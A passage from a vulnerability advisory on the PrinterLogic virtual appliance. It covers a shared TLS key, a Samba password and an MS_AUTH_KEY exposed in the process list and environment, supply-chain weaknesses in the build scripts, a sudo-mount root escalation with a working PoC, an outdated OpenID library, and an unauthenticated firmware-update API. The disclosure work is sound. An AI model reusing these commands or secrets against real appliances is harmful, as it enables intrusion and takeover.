out2093911dc1a1 printerlogic/scd:1.0.70 "/var/www/app/.docke" 6 hours ago Up 6 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_scd.1.ppbu3zen3nxc4a9mbibocypb6
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
a058dddcdc76 printerlogic/authn:1.0.257 "/var/www/app/.docke" 6 hours ago Up 6 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_authn.1.6nguqh8gx3n1zqromg63zbjhd
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
4b14b2d3e5f4 printerlogic/pi:5.0.6539 "/var/www/app/.docke" 6 hours ago Up 6 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-high.1.o5dzhxx4rwq0qkx52ulm198a9
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
ccd58c6422ae printerlogic/tree:1.0.57 "/var/www/app/.docke" 6 hours ago Up 6 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_tree.1.vbe3pg3zk3db1yytu3q109ejh
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
472cd50c71e3 printerlogic/pi:5.0.6539 "/var/www/app/.docke" 6 hours ago Up 6 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_pi.1.q4rk166ph4at73tk0xhcj48ko
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
7276af63e9db printerlogic/idpi:1.0.6 "/var/www/app/.docke" 6 hours ago Up 6 hours (healthy) 80/tcp, 443/tcp, 9000-9001/tcp printercloud_idpi.1.c3xqu7i4zfzk5sm3h0kxtxq2e
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
0a4c92b1e67e printerlogic/users:5.186.1 "/var/www/app/.docke" 6 hours ago Up 6 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-users-queue.1.qmf6gz6cjonf89mg1ppl2xxjk
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
e43ae54c74d1 printerlogic/pi:5.0.6539 "/var/www/app/.docke" 6 hours ago Up 6 hours 80/tcp, 443/tcp, 9000-9001/tcp printercloud_worker-pi-low.1.9zjdza3fe2gfy10perdw7k8sx
e6932e54ceb0199a35ee037a96fe42003265f8859b3a5e45e505e9fe8b8c7eee  /etc/ssl/private/pl-local.com.key
b1eaaffdb17148ec11be1de2116ee63e61bfb49f3cbcd25ace3c253536a5642e  /etc/ssl/certs/pl-local.com.pem
</code></pre>
<p>Analysis of the certificate:</p>
<pre><code>kali% openssl x509 -in pl-local.com.pem -text -noout

Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            8f:9c:26:3f:6b:08:96:bf
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C = US, ST = UT, L = St George, O = PrinterLogic, OU = Engineering, CN = PrinterLogic, emailAddress = noreply@printerlogic.com
        Validity
            Not Before: Nov 19 21:58:11 2018 GMT
            Not After : Jun 13 21:58:11 2117 GMT
        Subject: C = US, ST = UT, L = St George, O = PrinterLogic, OU = Engineering, CN = PrinterLogic, emailAddress = no-reply@printerlogic.com
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:c6:ef:0f:cb:da:41:de:79:51:16:3f:25:6c:bb:
                    98:3c:98:e1:e8:1f:04:96:e9:8f:d2:e9:95:8a:fe:
                    c7:a8:41:22:e6:a2:5b:50:77:d2:c3:07:e6:de:1e:
                    09:e2:b6:21:af:43:21:d8:03:5c:2d:70:6c:89:8f:
                    fc:1b:3a:5e:10:f4:22:2e:74:12:64:4f:57:48:9c:
                    55:2b:f8:88:75:9b:90:57:78:57:fd:72:11:4f:1a:
                    44:4f:1b:29:ae:b2:f9:64:e6:ec:e1:af:a9:e6:5e:
                    61:f4:5b:f6:24:92:47:ab:5f:f0:06:a0:25:43:36:
                    e8:2d:2e:f0:d1:6f:96:b1:e8:b5:75:e0:8c:2d:99:
                    ea:03:8d:91:82:f3:75:91:ef:5f:8d:7d:70:e9:3d:
                    e2:96:79:e8:19:22:f4:80:45:e6:48:b3:e8:48:e9:
                    33:68:c3:6e:dc:fd:99:c0:96:38:92:a5:05:31:dd:
                    a6:ef:3c:0f:9c:34:86:42:ed:ec:ea:08:35:dd:61:
                    20:a7:90:a8:da:fe:07:5b:77:10:29:ff:4f:9c:20:
                    9a:3a:ac:c7:83:e2:42:22:84:45:de:ba:89:2a:66:
                    c9:8f:1a:59:19:cc:4b:3e:5d:5d:62:ba:9a:1a:91:
                    53:55:ef:ff:f3:ec:9f:4a:28:c5:e7:be:c6:e4:bf:
                    94:bf
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Authority Key Identifier: 
                keyid:75:FB:82:08:93:6B:E3:28:E7:FD:49:45:63:4B:DA:96:55:65:35:58

            X509v3 Basic Constraints: 
                CA:FALSE
            X509v3 Key Usage: 
                Digital Signature, Non Repudiation, Key Encipherment, Data Encipherment
            X509v3 Subject Alternative Name: 
                DNS:*.pl-local.com
    Signature Algorithm: sha256WithRSAEncryption
         3c:94:ec:2e:cd:b2:0a:85:ab:ee:af:6c:73:ce:52:ed:f4:ea:
         89:17:ca:ce:db:99:84:a1:69:47:03:9e:aa:df:78:ca:b9:dc:
         09:39:2b:cc:3b:c4:ad:81:3d:9d:fb:4d:99:e8:c2:b8:95:99:
         b1:7a:8b:10:00:1c:d3:67:23:f6:47:d9:50:30:c7:4a:ff:6a:
         c1:9e:4e:45:7c:1a:aa:e4:05:24:e2:44:6d:56:43:97:99:61:
         13:a6:b8:4a:b9:c4:76:0f:5b:89:fe:17:f7:8e:82:ee:61:a4:
         23:10:53:e6:67:38:0f:af:dc:33:4e:a5:98:36:e0:16:01:a3:
         3c:e4:71:e5:f7:73:b2:16:22:0d:de:fa:47:a7:72:e2:08:ad:
         b9:66:7c:70:e5:93:39:f2:f3:7e:2e:03:5b:88:b3:cf:db:0d:
         45:2a:1e:28:ba:73:c8:51:b2:5b:a5:05:02:0d:68:59:22:5b:
         e5:6b:23:09:65:82:8a:9e:9a:15:3a:78:e3:22:d8:42:93:83:
         c1:c2:c9:47:10:fc:78:3f:c4:1e:e5:d9:d0:12:1e:e7:c9:01:
         d1:4e:b7:45:0f:ae:0f:84:c4:af:2d:a7:91:d5:99:1d:d7:1e:
         c2:e1:f1:14:6a:03:d4:06:4b:92:ca:9a:e7:68:c9:96:38:2b:
         62:4c:cc:ea
kali%
</code></pre>
<p>An attacker may use this certificate for MITM purposes.</p>
<p><a id="va-disclosure-samba-password"></a></p>
<h2>Details - Samba password available in the process list</h2>
<p>It was observed that the samba password is available in the process list:</p>
<pre>
root@printerlogic:~# ps -auxw | grep admin
root      1262  0.0  0.0  14440  1024 pts/3    S+   08:51   0:00 grep --color=auto admin
root      4066  0.0  0.0    780     0 ?        Ss   01:51   0:01 /sbin/tini -- /opt/entrypoint.sh -r -s appliance-storage;/mnt/appliance-storage;yes;no;no;admin;none;admin
-u admin;<font color=red>4rd7AqdBvj7ZdGKrvQ9Z</font> -g server signing = mandatory
root      4798  0.0  0.0   2208    56 ?        S    01:51   0:00 bash /opt/entrypoint.sh -r -s appliance-storage;/mnt/appliance-storage;yes;no;no;admin;none;admin
-u admin;<font color=red>4rd7AqdBvj7ZdGKrvQ9Z</font> -g server signing = mandatory
root@printerlogic:~#
</pre>

<p>The password is used for the configuration of the <code>dperson/samba</code> Docker instance:</p>
<pre><code>root@printerlogic:~# docker ps | grep 34c81cb53b33
34c81cb53b33        dperson/samba:latest             "/sbin/tini -- /opt/"   7 hours ago         Up 7 hours (healthy)   139/tcp, 137-138/udp, 445/tcp    config_samba.1.0bb6swjcmo97cnlf0rak8l8h3
root@printerlogic:~# docker exec -it 34c81cb53b33 /bin/bash
bash-5.0# ps -a
PID   USER     TIME  COMMAND
    1 root      0:01 /sbin/tini -- /opt/entrypoint.sh -r -s appliance-storage;/mnt/appliance-storage;yes;no;no;admin;none;admin -u admin;4rd7AqdBvj7ZdGKrvQ9Z 
    7 root      0:00 bash /opt/entrypoint.sh -r -s appliance-storage;/mnt/appliance-storage;yes;no;no;admin;none;admin -u admin;4rd7AqdBvj7ZdGKrvQ9Z -g server
   11 root      0:00 smbd -FS --no-process-group
   58 root      0:00 {smbd-notifyd} smbd -FS --no-process-group
   59 root      0:00 {cleanupd} smbd -FS --no-process-group
 3219 root      0:00 /bin/bash
 3225 root      0:00 ps -a
bash-5.0#
</code></pre>
<p>An attacker who can list processes in the machine can retrieve this password in clear-text and proceed to lateral movements.</p>
<p><a id="va-supply-chain-build-system"></a></p>
<h2>Details - Supply Chain attack against the PrinterLogic build system</h2>
<p>The solution contains build scripts:</p>
<p>Content of <code>/opt/version.env</code>:</p>
<pre><code>kali# cat /opt/version.env 
export VERSION=0.0
export FULL_VERSION=0.0.1374
export SERVICE_CODE=cicd
</code></pre>
<p>The scripts are using insecure communication methods and using external Docker images.</p>
<p>The <code>/opt/docker-compose.yaml</code> file  will use <code>https://hub.docker.com/r/vladgh/gpg</code> without checking whether the image is malicious or not. Furthermore, it will store the private GPG of no-reply+virtual-appliance@printerlogic.com:</p>
<p>Content of <code>/opt/docker-compose.yaml</code>:</p>
<pre>
  1 version: '3.7'
  2 
  3 x-volumes:
  4   - &v-code ./:/opt
  5   - &v-etc ./.docker-config/storage/etc:/etc/printercloud
  6   - &v-storage ./.docker-config/storage/efs:/var/www/efs_storage
  7   - &v-install ./.docker-config/storage/install:/install
  8   - &v-aws ~/.aws:/home/ubuntu/.aws
 68   # ci-import-gpg is used in the bitbucket pipeline for importing GPG keys into the image
 69   ci-import-gpg:
<font color=red> 70     image: vladgh/gpg:latest</font>
 71     volumes:
 72       - ./.build/keys:/srv/.gpg
 73       - ./.build/.gnupg:/root/.gnupg
 74     entrypoint: /bin/sh
 75     command: |
 76       -euxc "
 77         ls -la /srv/.gpg
 78         for sec in /srv/.gpg/*/*sec.gpg.gpg; do
 79           gpg --decrypt --pinentry-mode loopback --passphrase \"${BUILD_GPG_KEY_SECRET}\" \"$${sec}\" | gpg --import --yes --pinentry-mode loopback --passp    hrase \"${GPG_SIGNING_PASSWORD}\";
 80         done
 81         for pub in /srv/.gpg/*/*pub.gpg; do
 82           gpg --import --yes --no-tty \"$${pub}\"
 83         done
 84         echo -e \"trust\n5\ny\n\" | gpg --command-fd 0 --no-tty --edit-key '<no-reply+virtual-appliance@printerlogic.com>'
 85         gpg --list-keys
 86       "
</pre>

<p>The <code>/opt/includes/provision/va-build-node.sh</code> script will fetch the Virtualbox extensions over HTTP and install them as root without checking the signatures of these files. An attacker located on the network can get Remote Code Execution.</p>
<p>Content of <code>/opt/includes/provision/va-build-node.sh</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">67</span> <span style="color: #408080; font-style: italic"># Install vbox extensions</span>
 <span style="color: #666666">68</span> <span style="color: #19177C">VBOXVERSION</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">$(</span>VBoxManage --version | sed -r <span style="color: #BA2121">&#39;s/([0-9])\.([0-9])\.([0-9]{1,2}).*/\1.\2.\3/&#39;</span><span style="color: #008000; font-weight: bold">)</span>
 <span style="color: #666666">69</span> wget -q -N <span style="color: #BA2121">&quot;http://download.virtualbox.org/virtualbox/</span><span style="color: #19177C">$VBOXVERSION</span><span style="color: #BA2121">/Oracle_VM_VirtualBox_Extension_Pack-</span><span style="color: #19177C">$VBOXVERSION</span><span style="color: #BA2121">.vbox-extpack&quot;</span>
 <span style="color: #666666">70</span> <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;y&quot;</span> | sudo VBoxManage extpack install --replace Oracle*.vbox-extpack
</pre></div>

<p>There is also a Local Privilege Escalation for the Jenkins user on the build machine, allowing mounting any directory (e.g. /etc) or file and getting root access.</p>
<p>Content of <code>/opt/includes/provision/va-build-node.sh</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span> <span style="color: #666666">13</span> <span style="color: #408080; font-style: italic"># Whitelist the jenkins user to run mount or umount as sudo</span>
 <span style="color: #666666">14</span> <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;Installing jenkins sudo permissions for mount/umount&quot;</span>
 <span style="color: #666666">15</span> <span style="color: #008000; font-weight: bold">if</span> <span style="color: #666666">[[</span> <span style="color: #008000; font-weight: bold">$(</span>sudo grep <span style="color: #BA2121">&quot;^jenkins &quot;</span> /etc/sudoers | grep <span style="color: #BA2121">&quot;/bin/mount,/bin/umount&quot;</span> | wc -l<span style="color: #008000; font-weight: bold">)</span> -lt <span style="color: #666666">1</span> <span style="color: #666666">]]</span>; <span style="color: #008000; font-weight: bold">then</span>
 <span style="color: #666666">16</span>   <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;# Allow jenkins to mount/umount directories (used for mounting the matrix cache)&quot;</span> | sudo tee -a /etc/sudoers
 <span style="color: #666666">17</span>   <span style="color: #008000">echo</span> <span style="color: #BA2121">&quot;jenkins    ALL=(ALL)    NOPASSWD: /bin/mount,/bin/umount&quot;</span> | sudo tee -a /etc/sudoers
 <span style="color: #666666">18</span> <span style="color: #008000; font-weight: bold">fi</span>
</pre></div>

<p>PoC to get root privileges from the jenkins user:</p>
<pre><code>$ sudo mount -o bind /bin/sh /bin/mount
$ sudo mount
# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>The security of the build system of PrinterLogic relies on the DockerHub account <code>vladg</code>. This account doesn't belong to PrinterLogic.</p>
<p>The transfer of Virtualbox extension pack is done over HTTP without verification, and an attacker doing MITM can compromise the build system.</p>
<p>The Jenkins account on the build system has root access because of permissive sudo rules.</p>
<p><a id="va-vulnerable-openid"></a></p>
<h2>Details - Vulnerable OpenID implementation</h2>
<p>The OpenID implementation at <code>/var/www/app/lib/common/lightopenid/openid.php</code> is completely outdated, with a version from 2010, and is also vulnerable to Man-In-The-Middle attacks:</p>
<p>Content of <code>/var/www/app/lib/common/lightopenid/openid.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
  <span style="color: #666666">2</span> <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic">  3  * This class provides a simple interface for OpenID (1.1 and 2.0) authentication.</span>
<span style="color: #BA2121; font-style: italic">  4  * Supports Yadis discovery.</span>
<span style="color: #BA2121; font-style: italic">  5  * The authentication process is stateless/dumb.</span>
<span style="color: #BA2121; font-style: italic">  6  *</span>
<span style="color: #BA2121; font-style: italic">[...]</span>
<span style="color: #BA2121; font-style: italic"> 42  * The library depends on curl, and requires PHP 5.</span>
<span style="color: #BA2121; font-style: italic"> 43  * @author Mewp</span>
<span style="color: #BA2121; font-style: italic"> 44  * @copyright Copyright (c) 2010, Mewp</span>
<span style="color: #BA2121; font-style: italic"> 45  * @license http://www.opensource.org/licenses/mit-license.php MIT</span>
<span style="color: #BA2121; font-style: italic"> 46  */</span>
 <span style="color: #666666">47</span> <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">LightOpenID</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">118</span>     <span style="color: #008000; font-weight: bold">protected</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">request</span>(<span style="color: #19177C">$url</span>, <span style="color: #19177C">$method</span><span style="color: #666666">=</span><span style="color: #BA2121">&#39;GET&#39;</span>, <span style="color: #19177C">$params</span><span style="color: #666666">=</span><span style="color: #008000; font-weight: bold">array</span>())
<span style="color: #666666">119</span>     {
<span style="color: #666666">120</span>         <span style="color: #19177C">$params</span> <span style="color: #666666">=</span> <span style="color: #008000">http_build_query</span>(<span style="color: #19177C">$params</span>, <span style="color: #BA2121">&#39;&#39;</span>, <span style="color: #BA2121">&#39;&amp;&#39;</span>);
<span style="color: #666666">121</span>         <span style="color: #19177C">$curl</span> <span style="color: #666666">=</span> <span style="color: #008000">curl_init</span>(<span style="color: #19177C">$url</span> <span style="color: #666666">.</span> (<span style="color: #19177C">$method</span> <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;GET&#39;</span> <span style="color: #666666">&amp;&amp;</span> <span style="color: #19177C">$params</span> <span style="color: #666666">?</span> <span style="color: #BA2121">&#39;?&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$params</span> <span style="color: #666666">:</span> <span style="color: #BA2121">&#39;&#39;</span>));
<span style="color: #666666">122</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$curl</span>, CURLOPT_FOLLOWLOCATION, <span style="color: #008000; font-weight: bold">true</span>);
<span style="color: #666666">123</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$curl</span>, CURLOPT_HEADER, <span style="color: #008000; font-weight: bold">false</span>);
<span style="color: #666666">124</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$curl</span>, CURLOPT_SSL_VERIFYPEER, <span style="color: #008000; font-weight: bold">false</span>); <span style="color: #408080; font-style: italic">// [1] ouch</span>
<span style="color: #666666">125</span>         <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$curl</span>, CURLOPT_RETURNTRANSFER, <span style="color: #008000; font-weight: bold">true</span>);
<span style="color: #666666">126</span>         <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$method</span> <span style="color: #666666">==</span> <span style="color: #BA2121">&#39;POST&#39;</span>) {
</pre></div>

<p>The verification of the SSL certificate is disabled on line 124.</p>
<p>From the Curl documentation, available at <a href="https://curl.se/libcurl/c/CURLOPT_SSL_VERIFYPEER.html">https://curl.se/libcurl/c/CURLOPT_SSL_VERIFYPEER.html</a>:</p>
<blockquote>
<p>WARNING: disabling verification of the certificate allows bad guys to man-in-the-middle the communication without you knowing it. Disabling verification makes the communication insecure. Just having encryption on a transfer is not enough as you cannot be sure that you are communicating with the correct end-point.
- https://curl.se/libcurl/c/CURLOPT_SSL_VERIFYPEER.html</p>
</blockquote>
<p>The official source code is available at <a href="https://github.com/iignatov/LightOpenID">https://github.com/iignatov/LightOpenID</a> and has not been maintained since 2016.</p>
<p>This PHP library has been known for years for being insecure. From <a href="https://marc.info/?l=openid-security&amp;m=155477050605610&amp;w=2">https://marc.info/?l=openid-security&amp;m=155477050605610&amp;w=2</a>:</p>
<blockquote>
<p>In my testing, I found a PHP open source library for OpenID named "LightOpenID" that is also high-risk to SSRF attacks. This PHP library appears to be quite popular as well in the community, and in my opinion, iseven riskier than ruby-openid.  In addition to the SSRF weakness, I was able to demonstrate auth bypass against one affected app by performing whatis known as a Malicious Endpoint Attack (an attacker spoof's an OpenID 2.0 Provider (OP), and uses the Blind SSRF to gain unauthorized access to other app user accounts).</p>
</blockquote>
<p>This code is vulnerable to Man-In-The-Middle and SSRF.</p>
<p>The version used in the solution is completely outdated, for more than 10 years.</p>
<p>This library is not supported since 2016.</p>
<h2>Vulnerabilities specific to PrinterLogic VA</h2>
<p><a id="va-insecure-firmware-update-ms-auth-key"></a></p>
<h2>Details - Insecure firmware image update using the MS_AUTH_KEY variable</h2>
<p>By default, the variable <code>MS_AUTH_KEY</code> is imported into a large number of Docker instances. Here are the Docker instances with access to this private key.</p>
<p>Finding Docker instances with access to the <code>MS_AUTH_KEY</code> environment variable:</p>
<pre><code>root@printerlogic:~# for i in $(docker ps | awk '{ print $1 }'); do echo -n "$(docker ps|grep $i | awk '{ print $2 }') "; echo -n "$(docker exec -it $i env | grep MS_AUTH_KEY)";echo;done
printerlogic/pi:5.0.6539        MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/pi:5.0.6539        MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/pi:5.0.6539        MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/pi:5.0.6539        MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/va-api:1.1.4       MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/tree:1.0.57        MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/authn:1.0.257      MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/identity:v1.0.88   MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/users:5.186.1      MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/idpi:1.0.6         MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/sched:1.0.18       MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/ebc:1.0.34         MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/oncp-pgw:v1.0.21   MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/scss:1.0.39        MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
traefik:latest
printerlogic/scd:1.0.70         MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/eb:0.0.4           MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
redis:5-alpine 
printerlogic/pi:5.0.6539        MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/gw:1.208.5         MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/cpp-ui:1.80.5      MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/client:25.1.0.551 
printerlogic/oncp-reg:1.0.15    MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/users:5.186.1      MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/oncp-ofn:v1.0.6    MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/prs:1.0.2          MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/br:1.0.62          MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/edw:1.0.44         MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/oncp-hold:v1.0.31  MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/cat:1.0.58         MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/qms:1.0.124        MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
dperson/samba:latest 
printerlogic/pi:5.0.6539        MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/pq:5.0.124         MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/scim:1.0.9         MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
mysql:8.0.26 
portainer/agent:latest 
printerlogic/va-cdn:0.0.435     MS_AUTH_KEY=ccb33b57-7960-409c-9d15-b6c5b475c839
printerlogic/hive:1.1.30 
root@printerlogic:~#
</code></pre>
<p>This variable is used to manage the firmware update processus using the <code>/va-api</code> route (managed by the Docker instance <code>va-api</code>, with the program <code>/opt/va-api</code>).</p>
<p>By default, the route <code>/va-api</code> doesn't implement a standard authentication mechanism.</p>
<p>The API <code>/va-api/v1/update/filename?sign=%s&amp;timestamp=%d</code> provides the firmware update interface, allowing an attacker to upload a malicious firmware image (signed using the previous GPG key extracted) to a remote appliance.</p>
<p>The update is a 2-step process:</p>
<ul>
<li>Request to <code>/va-api/v1/update/filename?sign=unique_signature&amp;timeStamp=current_timestamp</code> with the GPG-encrypted firmware image</li>
<li>Request to <code>/va-api/v1/update/filename?sign=unique_signature&amp;timeStamp=current_timestamp</code></li>
</ul>
<p>In these 2 steps, there are no session cookies or authentication mechanism based on login/password:</p>
<p><img alt="" src="images/2025-vasion-report-1-update-01.png" /></p>
<p><a href="images/2025-vasion-report-1-update-01-full.png">Click here for full image</a></p>
<p>Uploading the firmware image</p>
<p><img alt="" src="images/2025-vasion-report-1-update-02.png" /></p>
<p><a href="images/2025-vasion-report-1-update-02-full.png">Click here for full image</a></p>
<p>Installing the firmware image</p>
<p>The update process works using a correct sign value associated with a timestamp. This sign value is calculcated using the <code>MS_AUTH_KEY</code> value in the <code>/var/www/app/app/Services/SignService.php</code> file implementing the SignService class:</p>
<p>Content of <code>/var/www/app/app/Services/SignService.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">13</span> <span style="color: #008000; font-weight: bold">class</span> <span style="color: #0000FF; font-weight: bold">SignService</span>
 <span style="color: #666666">14</span> {
 <span style="color: #666666">15</span>     <span style="color: #BA2121; font-style: italic">/**</span>
<span style="color: #BA2121; font-style: italic"> 16      * Return an array that contains the info needed to sign a request</span>
<span style="color: #BA2121; font-style: italic"> 17      *</span>
<span style="color: #BA2121; font-style: italic"> 18      * @param string $siteId The siteId to use</span>
<span style="color: #BA2121; font-style: italic"> 19      *</span>
<span style="color: #BA2121; font-style: italic"> 20      * @return array</span>
<span style="color: #BA2121; font-style: italic"> 21      */</span>
 <span style="color: #666666">22</span>     <span style="color: #008000; font-weight: bold">public</span> <span style="color: #008000; font-weight: bold">static</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">getSignInfo</span>(<span style="color: #19177C">$siteId</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">null</span>)
 <span style="color: #666666">23</span>     {
 <span style="color: #666666">24</span>         <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #666666">!</span><span style="color: #19177C">$siteId</span>) {
 <span style="color: #666666">25</span>             <span style="color: #19177C">$siteId</span> <span style="color: #666666">=</span> App<span style="color: #666666">::</span><span style="color: #7D9029">getSiteId</span>();
 <span style="color: #666666">26</span>         }
 <span style="color: #666666">27</span> 
 <span style="color: #666666">28</span>         <span style="color: #19177C">$currentTime</span> <span style="color: #666666">=</span> Carbon<span style="color: #666666">::</span><span style="color: #7D9029">now</span>();
 <span style="color: #666666">29</span> 
 <span style="color: #666666">30</span>         <span style="color: #19177C">$info</span> <span style="color: #666666">=</span> <span style="color: #008000">implode</span>(
 <span style="color: #666666">31</span>             <span style="color: #BA2121">&quot;,&quot;</span>,
 <span style="color: #666666">32</span>             [
 <span style="color: #666666">33</span>                 <span style="color: #BA2121">&#39;key&#39;</span> <span style="color: #666666">=&gt;</span> config(<span style="color: #BA2121">&#39;auth.microservice_auth_key&#39;</span>), <span style="color: #408080; font-style: italic">// [1] retrieve auth.microservice_auth_key</span>
 <span style="color: #666666">34</span>                 <span style="color: #BA2121">&#39;siteId&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$siteId</span>,
 <span style="color: #666666">35</span>                 <span style="color: #BA2121">&#39;timeStamp&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$currentTime</span>
 <span style="color: #666666">36</span>             ]
 <span style="color: #666666">37</span>         );
 <span style="color: #666666">38</span>         <span style="color: #19177C">$sign</span> <span style="color: #666666">=</span> Hash<span style="color: #666666">::</span><span style="color: #7D9029">make</span>(<span style="color: #19177C">$info</span>);                             <span style="color: #408080; font-style: italic">// [2] generation of a secure hash</span>
 <span style="color: #666666">39</span> 
 <span style="color: #666666">40</span>         <span style="color: #008000; font-weight: bold">return</span> [
 <span style="color: #666666">41</span>             <span style="color: #BA2121">&#39;sign&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$sign</span>,
 <span style="color: #666666">42</span>             <span style="color: #BA2121">&#39;timeStamp&#39;</span> <span style="color: #666666">=&gt;</span> <span style="color: #19177C">$currentTime</span>
 <span style="color: #666666">43</span>         ];
 <span style="color: #666666">44</span>     }
 <span style="color: #666666">45</span> }
</pre></div>

<p>On line 33, the variable <code>auth.microservice_auth_key</code> which is the previous environment variable <code>MS_AUTH_KEY</code> will be used as a secret key to generate a hash on the line 38.</p>
<p>An attacker knowing the <code>MS_AUTH_KEY</code> variable can create valid signatures for the upload process, without using credentials for authentication.</p>
